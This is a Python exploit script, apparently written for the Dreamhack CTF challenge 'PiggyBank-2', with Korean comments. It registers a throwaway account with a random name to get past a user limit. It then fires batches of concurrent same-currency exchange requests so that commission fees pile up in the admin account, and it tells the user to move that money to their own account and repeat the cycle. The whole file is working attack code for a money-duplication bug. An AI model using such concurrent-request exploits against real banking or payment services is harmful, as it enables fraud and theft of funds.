import asyncio
import aiohttp
import requests
import uuid
import time
import re
import random

TARGET_URL = "http://host8.dreamhack.games:18910"

async def duplicate_money(session, cookies, amount):
    url = f"{TARGET_URL}/cash/exchange"
    data = {
        "srcCurrency": "KRW",
        "dstCurrency": "KRW",
        "amount": str(amount)
    }
    try:
        async with session.post(url, data=data, cookies=cookies) as resp:
            await resp.read()
    except Exception:
        pass

async def main():
    print("="*60)
    print("🐖 PiggyBank-2 Compound Interest Glitch (복리 돈복사 버그) 🐖")
    print("="*60)

    s = requests.Session()
    # 50명 제한 회피를 위해 랜덤 이름 사용
    uid = f"h{uuid.uuid4().hex[:4]}"
    real_name = f"Hacker{random.randint(100, 999)}"
    
    print(f"\n[*] 1단계: 돈 복사용 임시 계정 생성 (ID: {uid}, Name: {real_name})")
    
    res_up = s.post(f"{TARGET_URL}/user/signup", data={
        "username": uid, "password": "Password123!", "email": f"{uid}@a.com",
        "realName": real_name, "regNumber": "990101000000000", "memo": "m", "countryCode": "82"
    })
    
    res_in = s.post(f"{TARGET_URL}/user/signin", data={"username": uid, "password": "Password123!"})
    
    if "alert alert-danger" in res_in.text or res_in.status_code != 200:
        print("\n[-] 계정 생성/로그인에 실패했습니다. 도커(docker restart piggybank-server)를 재시작해주세요!")
        return

    # 본인 계좌 번호 가져오기 (마이페이지)
    mypage = s.post(f"{TARGET_URL}/api/user/mypage").json()
    my_acc_number = mypage.get("accNumber", "알수없음")

    cookies = s.cookies.get_dict()
    connector = aiohttp.TCPConnector(limit=0)
    
    print(f"\n[+] 가입 성공! 내 계좌번호(Account Number)를 복사해두세요: {my_acc_number}")
    print("    (Admin 계정에서 이 계좌로 돈을 넘겨야 복리가 적용됩니다!)")

    async with aiohttp.ClientSession(connector=connector) as async_session:
        turn = 1
        while True:
            print("\n" + "-"*50)
            print(f"🔄 복리 연성 {turn}턴 시작!")
            print("-"*50)
            
            balance_input = input("현재 내 계좌의 KRW 잔고를 입력하세요 (숫자만, 끝내려면 q 입력): ")
            if balance_input.lower() == 'q':
                break
                
            try:
                current_balance = int(balance_input)
            except:
                print("숫자만 입력해주세요!")
                continue

            # 수수료(0.8%)를 포함해 내 잔고를 넘지 않는 최대 환전 금액 계산
            # amount * 1.008 <= current_balance
            safe_amount = int(current_balance / 1.008) - 10 
            commission = safe_amount * 0.008
            
            BATCHES = 100 # 한 턴에 1,000번 발사
            expected_profit = commission * BATCHES
            
            print(f"  [*] 1회 환전 요청 금액: {safe_amount}원 (건당 수수료: 약 {commission:.0f}원)")
            print(f"  [*] {BATCHES}발 발사 준비 완료! (예상 수익: Admin 계좌에 약 +{expected_profit:,.0f}원 창조)")
            
            start_time = time.time()
            # 50개씩 끊어서 1000발 발사
            for i in range(0, BATCHES, 50):
                tasks = [asyncio.create_task(duplicate_money(async_session, cookies, safe_amount)) for _ in range(50)]
                await asyncio.gather(*tasks)
                
            print(f"\n[🔥] {turn}턴 발사 완료! (소요시간: {time.time()-start_time:.2f}초)")
            print("\n👉 [수동 작업 지침]")
            print("  1. 웹 브라우저에서 Admin(ID: admin)으로 로그인하세요.")
            print(f"  2. 'Bank' 메뉴로 가서 잔고를 전부 내 계좌({my_acc_number})로 송금하세요.")
            print("  3. 다시 내 계좌로 로그인해서 늘어난 잔고를 아래에 입력하세요!\n")
            turn += 1

if __name__ == "__main__":
    asyncio.run(main())